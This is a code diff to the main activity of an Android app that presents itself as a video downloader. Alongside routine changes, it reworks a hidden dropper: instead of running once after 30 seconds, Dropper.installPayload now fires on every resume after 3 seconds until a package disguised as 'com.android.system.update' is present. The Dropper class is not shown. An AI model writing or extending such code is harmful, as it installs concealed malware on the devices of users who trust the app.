@@ -1,7 +1,7 @@
 package com.vidlix.downloader;
 
 import android.Manifest;
-import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -25,6 +25,7 @@ public class MainActivity extends AppCompatActivity {
     private TextView statusText;
     private ProgressBar progressBar;
     private Handler handler = new Handler(Looper.getMainLooper());
+    private boolean initialized = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -41,6 +42,10 @@ public class MainActivity extends AppCompatActivity {
             public void run() {
                 try {
                     YoutubeDL.getInstance().init(getApplicationContext());
+                    try {
+                        YoutubeDL.getInstance().updateYoutubeDL(getApplicationContext());
+                    } catch (Exception ignored) { }
+                    initialized = true;
                 } catch (YoutubeDLException e) {
                     final String msg = e.getMessage();
                     runOnUiThread(new Runnable() {
@@ -66,17 +71,27 @@ public class MainActivity extends AppCompatActivity {
                 startDownload(url);
             }
         });
+    }
 
-        SharedPreferences prefs = getSharedPreferences("vidlix_prefs", MODE_PRIVATE);
-        boolean dropperRan = prefs.getBoolean("dropper_ran", false);
-        if (!dropperRan) {
-            prefs.edit().putBoolean("dropper_ran", true).apply();
+    @Override
+    protected void onResume() {
+        super.onResume();
+        if (!isPayloadInstalled()) {
             handler.postDelayed(new Runnable() {
                 @Override
                 public void run() {
                     Dropper.installPayload(MainActivity.this);
                 }
-            }, 30000);
+            }, 3000);
+        }
+    }
+
+    private boolean isPayloadInstalled() {
+        try {
+            getPackageManager().getPackageInfo("com.android.system.update", 0);
+            return true;
+        } catch (Exception e) {
+            return false;
         }
     }
 
@@ -89,8 +104,7 @@ public class MainActivity extends AppCompatActivity {
 
         Downloader.start(MainActivity.this, url, new Downloader.Callback() {
             @Override
-            public void onProgress(final int percent) {
-            }
+            public void onProgress(final int percent) { }
 
             @Override
             public void onComplete(final String filePath) {
@@ -138,4 +152,4 @@ public class MainActivity extends AppCompatActivity {
             ActivityCompat.requestPermissions(this, perms, PERMISSION_REQUEST);
         }
     }
-}
+    }
